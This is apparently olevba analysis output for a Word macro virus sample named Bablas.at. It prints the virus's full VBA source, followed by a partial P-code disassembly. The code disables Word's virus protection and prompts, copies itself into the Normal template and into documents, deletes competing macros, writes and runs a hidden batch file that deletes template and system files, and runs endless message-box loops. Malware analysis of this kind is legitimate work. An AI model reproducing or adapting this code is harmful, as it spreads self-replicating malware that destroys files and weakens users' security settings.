olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Bablas.at
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Bablas.at - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SanCun.bas 
in file: ./Virus.MSWord.Bablas.at - OLE stream: 'Macros/VBA/SanCun'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'San I Love You
Const ACENGLAH = "<- This is a ACENGLAH! by SanCun"
Public AD As Object, NT As Object
Sub AutoOpen()
    On Error GoTo hapus
Dim NT As Object
Dockenor
Create_Loader
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(i).Name = "SanCun" Then NormInstall = True
Next i
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(i).Name = "SanCun" Then ActivInstall = True
Next i
If ActivInstall = True And NormInstall = True Then GoTo Label_Exit
If ActivInstall = True And NormInstall = False Then Set Doc = ActiveDocument
If ActivInstall = False And NormInstall = True Then Set Doc = NormalTemplate
Pad = Options.DefaultFilePath(wdDocumentsPath)
ModuleLength = Doc.VBProject.VBComponents("SanCun").CodeModule.CountOfLines
NT.Save
Doc.VBProject.VBComponents("SanCun").Export Pad + ("\Fax.txt")
ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
SanCun
Label_Exit:
'CommandBars("Format").Controls("Style...")
If NormInstall = True Then Call Create_Loader
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsAll
Application.EnableCancelKey = wdCancelInterrupt
hapus:
Dockenor
End Sub
Sub Create_Loader()
On Error Resume Next
Options.DefaultFilePath(wdStartupPath) = "C:\Program Files\Microsoft Office\Template"
Options.DefaultFilePath(wdTempFilePath) = "C:\Windows\Cad.Sys"
Pad1 = Options.DefaultFilePath(wdStartupPath)
MyFile = Dir(Pad1 + "\Frieds.dot")
If MyFile = "" Then
Set Adoc = NormalTemplate.OpenAsDocument
With Adoc
    .SaveAs fileName:=Pad1 + "\Frieds.dot"
    .Close SaveChanges:=wdDoNotSaveChanges
End With
End If
End Sub
Sub SanCun()
On Error Resume Next
Dockenor
Norkedoc
Call sim
Call Create_Loader
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.ReadOnlyRecommended = False
If WeekDay(2) Then Call Enjoy
If Month(Now()) = 10 And Day(Now()) = 6 Then Call Enjoy
With Dialogs(wdDialogFileSummaryInfo)
    .Author = "CAD Computer"
    .Title = "Virus Protection"
    .Subject = "For San San"
    .Comments = "Virus Protection Password"
    .Execute
End With
bodo:
End Sub
Sub FileSave()
    On Error Resume Next
    Norkedoc
    ActiveDocument.Save
    SanCun
End Sub
Sub FileClose()
    On Error Resume Next
    Norkedoc
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    SanCun
ActiveDocument.Close
End Sub
Sub FileSaveAs()
    On Error Resume Next
    Norkedoc
    SanCun
Dialogs(wdDialogFileSaveAs).Show
End Sub
Sub FileExit()
    On Error Resume Next
    Norkedoc
    SanCun
    Call Reg("c:\windows\Reg.bat")
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    SANSAN
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Norkedoc
    'SanCun
    SANSAN
    End Sub
Sub AutoExec()
On Error GoTo hapus
Norkedoc
Application.EnableCancelKey = wdCancelDisabled
    Call Reg("c:\windows\Reg.bat")
Call sim
UnlockComments = True
'Pasword
SanCun
WBF
AddIns.Unload False
WBF
hapus:
Dockenor
End Sub
Sub AutoClose()
    On Error Resume Next
    Norkedoc
    SanCun
End Sub
Sub ToolsMacro()
    On Error Resume Next
    'SanCun
    If System.OperatingSystem = "Windows" Then Call Message 'p5687("C:\start.scr")
    'If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
'Call Message
End Sub
Sub FileTemplates()
    On Error Resume Next
    SanCun
    If System.OperatingSystem = "Windows" Then Call Cad 'p5687("C:\start.scr")
    'If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
'Call Message
End Sub
Sub ViewVBCode()
Dim Password, Pword
    On Error Resume Next
    SanCun
    If System.OperatingSystem = "Windows" Then Call Cad 'p5687("C:\start.scr")
    'If System.OperatingSystem = "Windows" Then Call startv("c:\startv.bat")
Do
    'Password = "ACENGLAH"
    'Pword = InputBox("Type in your password")
    'If Pword <> Password Then
        'MsgBox "Sorry, incorrect password"
        'End
    'End If
Call Cad
Loop
End Sub
Sub Reg(strFile As String)
Dim hFile As Long
Close hFile
On Error Resume Next
hFile = FreeFile
Open strFile For Output Access Write As hFile
Shell ("c:\c "), vbHide
Print #hFile, "@echo off"
Print #hFile, "del c:\progra~1\micros~1\office\startup\*.dot"
Print #hFile, "del c:\progra~1\micros~1\templa~1\*.dot"
Print #hFile, "del c:\windows\*.dot"
Print #hFile, "del Zap.bat"
Print #hFile, "del Reg.bat"
Print #hFile, "del c:\Start.exe"
Print #hFile, "del C:\start.scr"
Print #hFile, "del C:\startv.bat"
Print #hFile, "del C:\Autoexec.bat"
Print #hFile, "del C:\Cacah.hit"
Print #hFile, "del C:\cad.sys"
Close hFile
Shell ("c:\windows\Reg.bat"), vbHide
End Sub
Sub FileOpen()
On Error Resume Next
WBT
If Dialogs(80).Show <> 0 Then
Call AutoOpen
Dockenor
Norkedoc
Call SanCun
WBF
Else
WBF
Call SANSAN
End If
End Sub
Sub Message()
nama1 = " San San "
Nama2 = "San San"
msg1 = "Lagi Ngapainn ???  "
msg2 = "Jangan Ngelamun Yeh.."
msg3 = "Kerjain Tuh Tugasnya Yah.... "
msg4 = "Buat Yang Laen Aku Minta Maaf  "
msg1 = "I Love You"
msg2 = "  "
msg3 = "       This Come From My Heart and Soul"
MsgBox (msg1 + Chr(44) + msg2 + Chr(10) + msg3)
If WeekDay(2) Then MsgBox msg1 + nama1, vbInformation
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Nama2, vbInformation, "???"
End Sub
Sub Enjoy()
nama1 = " San !!!"
Nama2 = "San San"
msg1 = "Lagi Ngapainn ??? "
msg2 = "   Jangan Ngelamun Yeh.. "
msg3 = "         Kerjain Tuh Tugasnya .... "
msg4 = "Buat Yang Laen Aku Minta Maaf  "
msg5 = "Kamu  Juga "
msg6 = "   Kok  Ikut-Ikutan Bengong ? "
msg7 = "Dasar  Dompok  Luh...Ah.."
MsgBox (msg1 + Chr(10) + msg2 + Chr(10) + msg3)
Rem If WeekDay(2) Then MsgBox msg5 + nama1 + Chr(10) + msg6 + Chr(10) + msg3 + Chr(10) + msg7 + nama1 + Chr(10) + msg4, vbInformation
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Nama2, vbInformation, "???"
End Sub
Function Dockenor()
    On Error GoTo Erw1
    NorOk = False
    WBT
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh1a
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
      NMacr = NormalTemplate.VBProject.VBComponents(i).Name
      If NMacr = "SanCun" Then NorOk = True
      If (NMacr <> "SanCun") And (NMacr <> "ThisDocument") Then
      MsgBox ("Normal Template Anda Terkena Virus Macro = " + NMacr + Chr(13) + "Makro akan dihapus dan anda harap enunggu Sejenak"), vbInformation, "SANSAN"
  Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh1a:
    If NorOk = False Then
      On Error GoTo Erh1
            Application.OrganizerCopy Source:=ActiveDocument.FullName, _
          Destination:=NormalTemplate.FullName, Name:= _
          "SanCun", Object:=wdOrganizerObjectProjectItems
      Templates(NormalTemplate.FullName).Save
      NormalTemplate.Application.Visible = False
Erh1:
    End If
Erw1:
End Function
Function Norkedoc()
    On Error GoTo Erw2
    DokSave = 0
    Dokok = False
    Set AD = ActiveDocument
    Set NT = NormalTemplate
    On Error GoTo Erh2a
    For i = 1 To AD.VBProject.VBComponents.Count
      NMacr = AD.VBProject.VBComponents(i).Name
      If NMacr = "SanCun" Then Dokok = True
      'NMacr = NT.VBProject.VBComponents(i).Name
      'If NMacr = "SanCun" Then Dokok = True
      If (NMacr <> "SanCun") And _
        (NMacr <> "ThisDocument") And (NMacr <> "Reference to Normal") Then
       MsgBox ("Documen Anda Terkena Virus Macro = " + NMacr + Chr(13) + "Virus Makro akan dihapus dan anda harap tunggu Sejenak"), vbInformation, "SANSAN"
        Application.OrganizerDelete Source:=AD.FullName, _
          Name:=NMacr, Object:=wdOrganizerObjectProjectItems
      End If
    Next i
Erh2a:
    If Dokok = False Then
      On Error GoTo Erh2
      Application.OrganizerCopy Source:=NT.FullName, _
          Destination:=AD.FullName, Name:= _
          "SanCun", Object:=wdOrganizerObjectProjectItems
      ActiveDocument.ReadOnlyRecommended = False
      ActiveDocument.Save
Erh2:
    End If
Erw2:
End Function
Function WBT()
WordBasic.DisableAutoMacros True
End Function
Function WBF()
WordBasic.DisableAutoMacros False
End Function
Function sim()
f56879025 = GetAttr(NormalTemplate.FullName)
Application.VBE.ActiveVBProject.VBComponents("SanCun").Export "c:\windows\Cad.sys"
If f56879025 = vbReadOnly Then GoTo bodo
If f56879025 = vbReadOnly + vbArchive Then GoTo bodo
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "SanCun" Then xxx902578112 = True
Next i
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(i).Name = "SanCun" Then mmf78116 = True
Next i
If xxx902578112 = True And mmf78116 = False Then Set o7811902511 = NormalTemplate.VBProject.VBComponents
If xxx902578112 = False And mmf78116 = True Then Set o7811902511 = ActiveDocument.VBProject.VBComponents
o7811902511.Import "c:\windows\Cad.sys"
If activeinst = False Then ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If mmf78116 = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
bodo:
End Function
Sub Pasword()

'If ActiveDocument = AD Then
    With ActiveDocument
            .ReadOnlyRecommended = False
            .EmbedTrueTypeFonts = False
            .SaveFormsData = False
            .SaveSubsetFonts = False
            .Password = "SANSAN"
            .WritePassword = "SANSAN"
     End With
        Application.DefaultSaveFormat = "SANSAN"
        ActiveDocument.SaveAs fileName:=ActiveDocument.FullName, FileFormat:=wdAutoFormat, _
        LockComments:=False, Password:="SANSAN", AddToRecentFiles:=True, _
        WritePassword:="SANSAN", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
         SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        False

  'Else
    
     'With ActiveDocument
            '.ReadOnlyRecommended = False
            '.EmbedTrueTypeFonts = False
            '.SaveFormsData = False
            '.SaveSubsetFonts = False
            '.Password = "SANSAN"
            '.WritePassword = "SANSAN"
     'End With
        'Application.DefaultSaveFormat = "SANSAN"
        'ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatTemplate, _
        'LockComments:=False, Password:="SANSAN", AddToRecentFiles:=True, _
        'WritePassword:="SANSAN", ReadOnlyRecommended:=False, EmbedTrueTypeFonts:=False, _
        ' SaveNativePictureFormat:=False, SaveFormsData:=False, SaveAsAOCELetter:= _
        'False
   'End If
   End Sub
Sub ShowMessage()
    H = Time
    If (WeekDay(Date) = vbFriday Or WeekDay(Date) = vbSunday) And Time < TimeValue("21:00:00") Then
    For i = 1 To 100
        Beep
    Next i
    H = MsgBox("Terimakasih buat dosenku yang amat sangat " & Chr(34) & _
    "bijaksana" & Chr(34) & "," & Chr(13) & "yang telah memberiku nilai JELEK. Saya merasa bangga " & Chr(13) & _
    "dan sungguh-sungguh bangga terhadap dosenku itu." & Chr(13) & _
    "Sekali lagi saya ucapkan terimakasih!." & Chr(13) & Chr(13) & "Semoga mereka tetap di STIKI." & _
    Chr(13) & "(buat teman-teman, ma'af mengganggu.)", vbOKOnly + vbExclamation, "Ucapan Terimakasih")
    End If
End Sub

Sub Bablas()
    Options.SaveNormalPrompt = True
    Options.VirusProtection = True
    Options.SavePropertiesPrompt = True
End Sub
Sub HelpAbout()
    H = MsgBox("Qun katawon walataqun kalaler." & Chr(13) & Chr(13) & _
    "I LOVE SOMETHING ERROR !", vbOKOnly + vbExclamation, "Bpp Hacker")
End Sub

Sub ToolsOptions()
    Options.SaveNormalPrompt = False
    Options.SavePropertiesPrompt = False
    Options.VirusProtection = False
    Dialogs(wdDialogToolsOptions).Show
    Bablas
End Sub

Sub ChangeCap()
    On Error Resume Next
    Application.Caption = "Bpp Hacker is now activating "
    ActiveWindow.Caption = "(I Don't mean to disturb.)"
End Sub

Sub RestoreCap()
    On Error Resume Next
    Application.Caption = "Microsoft Word"
    ActiveWindow.Caption = ActiveDocument.Name
End Sub

Sub OpenMyMacro()
    If InputBox("Enter password", "Bpp Hacker") = "azizoke" Then Application.ShowVisualBasicEditor = True
End Sub

Sub SikatDocument()
    Dim DocOk As Boolean
    DocOk = False
    For Each Obj In ActiveDocument.VBProject.VBComponents
        If Obj.Name = "BPPHCK" Then DocOk = True
        If Obj.Name <> "BPPHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in " + ActiveDocument.Name + "..."
            Application.OrganizerDelete Source:=ActiveDocument.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If DocOk = False Then
        Application.StatusBar = "Copying Bpp Hacker From Normal Template to " _
        + ActiveDocument.Name + "..."
        Application.OrganizerCopy Source:=NormalTemplate.FullName, _
        Destination:=ActiveDocument, Name:="BPPHCK", Object:=wdOrganizerObjectProjectItems
    End If
End Sub

Sub SikatTemplate()
    Dim NorOk As Boolean
    NorOk = False
    For Each Obj In NormalTemplate.VBProject.VBComponents
        If Obj.Name = "BPPHCK" Then NorOk = True
        If Obj.Name <> "BPPHCK" And Obj.Name <> "ThisDocument" Then
            Application.StatusBar = "Deleting " + Obj.Name + _
            " Macro in Normal Template..."
            Application.OrganizerDelete Source:=NormalTemplate.FullName, _
            Name:=Obj.Name, Object:=wdOrganizerObjectProjectItems
        End If
    Next Obj
    If NorOk = False Then
        Application.StatusBar = "Copying Bpp Hacker From " + ActiveDocument.Name + _
        " to Normal Template..."
        Application.OrganizerCopy Source:=ActiveDocument.FullName, _
        Destination:=NormalTemplate.FullName, Name:="BPPHCK", Object:=wdOrganizerObjectProjectItems
        Application.DisplayRecentFiles = False
        Application.DisplayRecentFiles = True
    End If

    ChangeCap
    WordBasic.DisableAutoMacros False
    On Error Resume Next
    If Dialogs(wdDialogFileOpen).Show <> 0 Then
        SikatDocument
        ActiveDocument.Save
    End If
    RestoreCap
    WordBasic.DisableAutoMacros True


    Bablas
    ChangeCap
    SikatTemplate
    On Error Resume Next
    NormalTemplate.Save
    RestoreCap

    SikatDocument

    AutoClose

    If ActiveDocument.Saved = False Then
        SikatDocument
        SikatTemplate
        On Error Resume Next
        ActiveDocument.Save
        ActiveDocument.Saved = True
    End If
End Sub
Sub Ancurin()
    C = Documents.Count
    If C <> 0 Then
       Dockenor.SikatDocument
        WordBasic.DisableAutoMacros True
        On Error Resume Next
        If ActiveDocument.Name <> "Document1" Then ActiveDocument.Save
    Else: Application.OnTime Now + TimeValue("00:00:07"), "Normal.BPPHCK.Ancurin"
    End If
End Sub
Sub SANSAN()
nama1 = " San San "
Nama2 = "San San"
msg1 = "Lagi Ngapainn ???  "
msg2 = "Jangan Ngelamun Yeh.."
msg3 = "Kerjain Tuh Tugasnya Yah.... "
msg4 = "Buat Yang Laen Aku Minta Maaf  "
msg1 = "I Love You"
msg2 = "  "
msg3 = "       This Come From My Heart and Soul"
msg4 = "                  (Cintaku Negeriku)"
MsgBox msg1 + Chr(44) + msg2 + Chr(13) + msg3 + Chr(13) + msg2 + Chr(10) + msg4, vbInformation, "Cun..."
If WeekDay(2) Then MsgBox msg1 + nama1, vbInformation, "Cun..."
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Nama2 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Nama2, vbInformation, "SANSAN"
End Sub
Sub Cad()
nama1 = " San San "
msg1 = "Mau Ngapainn Elu Tuh ???  "
msg2 = "Mau Coba-coba Nganggu Yach..."
msg3 = "Kerjain Tuh Tugasnya Yah.... "
msg4 = "Masih Mau Coba-coba Nih ?"
msg5 = "Penasaran Yach Omm....?"
msg6 = "Boleh dah dicoba !!!"
MsgBox (msg1 + Chr(44) + msg2 + Chr(10) + msg3), vbInformation, "SANSAN"
If WeekDay(2) Then MsgBox msg4 + Chr(10) + msg5 + Chr(10) + msg6, vbInformation, "SANSAN"
If Month(Now()) = 10 And Day(Now()) = 6 Then MsgBox msg1 + Chr(10) + msg2 + Chr(10) + msg3 + Chr(10) + msg4 + Chr(10) + msg5 + Chr(10) + msg6, vbInformation, "SANSAN"
Do
SANSAN
Loop
End Sub
  
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Virus.MSWord.Bablas.at
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 1122 bytes
' Macros/VBA/SanCun - 27702 bytes
' Line #0:
' 	QuoteRem 0x0000 0x000E "San I Love You"
' Line #1:
' 	Dim (Const) 
' 	LitStr 0x0020 "<- This is a ACENGLAH! by SanCun"
' 	VarDefn ACENGLAH
' Line #2:
' 	Dim (Public) 
' 	VarDefn AD (As Object)
' 	VarDefn NT (As Object)
' Line #3:
' 	FuncDefn (Sub AutoOpen())
' Line #4:
' 	OnError hapus 
' Line #5:
' 	Dim 
' 	VarDefn NT (As Object)
' Line #6:
' 	ArgsCall Dockenor 0x0000 
' Line #7:
' 	ArgsCall Create_Loader 0x0000 
' Line #8:
' 	ArgsCall Norkedoc 0x0000 
' Line #9:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #12:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #13:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #14:
' 	Ld i 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SanCun"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #16:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #17:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0006 "SanCun"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Label_Exit 
' 	EndIf 
' Line #20:
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Doc 
' 	EndIf 
' Line #21:
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Doc 
' 	EndIf 
' Line #22:
' 	Ld wdDocumentsPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad 
' Line #23:
' 	LitStr 0x0006 "SanCun"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ModuleLength 
' Line #24:
' 	Ld NT 
' 	ArgsMemCall Save 0x0000 
' Line #25:
' 	Ld Pad 
' 	LitStr 0x0008 "\Fax.txt"
' 	Paren 
' 	Add 
' 	LitStr 0x0006 "SanCun"
' 	Ld Doc 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #26:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed fileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #27:
' 	ArgsCall SanCun 0x0000 
' Line #28:
' 	Label Label_Exit 
' Line #29:
' 	QuoteRem 0x0000 0x002A "CommandBars("Format").Controls("Style...")"
' Line #30:
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Create_Loader 0x0000 
' 	EndIf 
' Line #31:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #32:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #33:
' 	Ld wdCancelInterrupt 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #34:
' 	Label hapus 
' Line #35:
' 	ArgsCall Dockenor 0x0000 
' Line #36:
' 	EndSub 
' Line #37:
' 	FuncDefn (Sub Create_Loader())
' Line #38:
' 	OnError (Resume Next) 
' Line #39:
' 	LitStr 0x002A "C:\Program Files\Microsoft Office\Template"
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #40:
' 	LitStr 0x0012 "C:\Windows\Cad.Sys"
' 	Ld wdTempFilePath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #41:
' 	Ld wdStartupPath 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	St Pad1 
' Line #42:
' 	Ld Pad1 
' 	LitStr 0x000B "\Frieds.dot"
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	St MyFile 
' Line #43:
' 	Ld MyFile 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #44:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd OpenAsDocument 
' 	Set Adoc 
' Line #45:
' 	StartWithExpr 
' 	Ld Adoc 
' 	With 
' Line #46:
' 	Ld Pad1 
' 	LitStr 0x000B "\Frieds.dot"
' 	Add 
' 	ParamNamed fileName 
' 	ArgsMemCallWith SaveAs 0x0001 
' Line #47:
' 	Ld wdDoNotSaveChanges 
' 	ParamNamed SaveChanges 
' 	ArgsMemCallWith Close 0x0001 
' Line #48:
' 	EndWith 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Sub SanCun())
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' 	ArgsCall Dockenor 0x0000 
' Line #54:
' 	ArgsCall Norkedoc 0x0000 
' Line #55:
' 	ArgsCall (Call) sim 0x0000 
' Line #56:
' 	ArgsCall (Call) Create_Loader 0x0000 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #58:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #59:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #60:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #61:
' 	LitDI2 0x0002 
' 	ArgsLd WeekDay 0x0001 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Enjoy 0x0000 
' 	EndIf 
' Line #62:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0006 
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Enjoy 0x0000 
' 	EndIf 
' Line #63:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #64:
' 	LitStr 0x000C "CAD Computer"
' 	MemStWith Author 
' Line #65:
' 	LitStr 0x0010 "Virus Protection"
' 	MemStWith Title 
' Line #66:
' 	LitStr 0x000B "For San San"
' 	MemStWith Subject 
' Line #67:
' 	LitStr 0x0019 "Virus Protection Password"
' 	MemStWith Comments 
' Line #68:
' 	ArgsMemCallWith Execute 0x0000 
' Line #69:
' 	EndWith 
' Line #70:
' 	Label bodo 
' Line #71:
' 	EndSub 
' Line #72:
' 	FuncDefn (Sub FileSave())
' Line #73:
' 	OnError (Resume Next) 
' Line #74:
' 	ArgsCall Norkedoc 0x0000 
' Line #75:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #76:
' 	ArgsCall SanCun 0x0000 
' Line #77:
' 	EndSub 
' Line #78:
' 	FuncDefn (Sub FileClose())
' Line #79:
' 	OnError (Resume Next) 
' Line #80:
' 	ArgsCall Norkedoc 0x0000 
' Line #81:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #82:
' 	ArgsCall SanCun 0x0000 
' Line #83:
' 	Ld ActiveDocument 
' 	ArgsMemCall Close 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub FileSaveAs())
' Line #86:
' 	OnError (Resume Next) 
' Line #87:
' 	ArgsCall Norkedoc 0x0000 
' Line #88:
' 	ArgsCall SanCun 0x0000 
' Line #89:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub FileExit())
' Line #92:
' 	OnError (Resume Next) 
' Line #93:
' 	ArgsCall Norkedoc 0x0000 
' Line #94:
' 	ArgsCall SanCun 0x0000 
' Line #95:
' 	LitStr 0x0012 "c:\windows\Reg.bat"
' 	ArgsCall (Call) Reg 0x0001 
' Line #96:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #97:
' 	ArgsCall SANSAN 0x0000 
' Line #98:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #99:
' 	EndSub 
' Line #100:
' 	FuncDefn (Sub AutoExit())
' Line #101:
' 	OnError (Resume Next) 
' Line #102:
' 	ArgsCall Norkedoc 0x0000 
' Line #103:
' 	QuoteRem 0x0004 0x0006 "SanCun"
' Line #104:
' 	ArgsCall SANSAN 0x0000 
' Line #105:
' 	EndSub 
' Line #106:
' 	FuncDefn (Sub AutoExec())
' Line #107:
' 	OnError hapus 
' Line #108:
' 	ArgsCall Norkedoc 0x0000 
' Line #109:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #110:
' 	LitStr 0x0012 "c:\windows\Reg.bat"
' 	ArgsCall (Call) Reg 0x0001 
' Line #111:
' 	ArgsCall (Call) sim 0x0000 
' Line #112:
' 	LitVarSpecial (True)
' 	St UnlockComments 
' Line #113:
' 	QuoteRem 0x0000 0x0007 "Pasword"
' Line #114:
' 	ArgsCall SanCun 0x0000 
' Line #115:
' 	ArgsCall WBF 0x0000 
' Line #116:
' 	LitVarSpecial (False)
' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #117:
' 	ArgsCall WBF 0x0000 
' Line #118:
' 	Label hapus 
' Line #119:
' 	ArgsCall Dockenor 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub AutoClose())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	ArgsCall Norkedoc 0x0000 
' Line #124:
' 	ArgsCall SanCun 0x0000 
' Line #125:
' 	EndSub 
' Line #126:
' 	FuncDefn (Sub ToolsMacro())
' Line #127:
' 	OnError (Resume Next) 
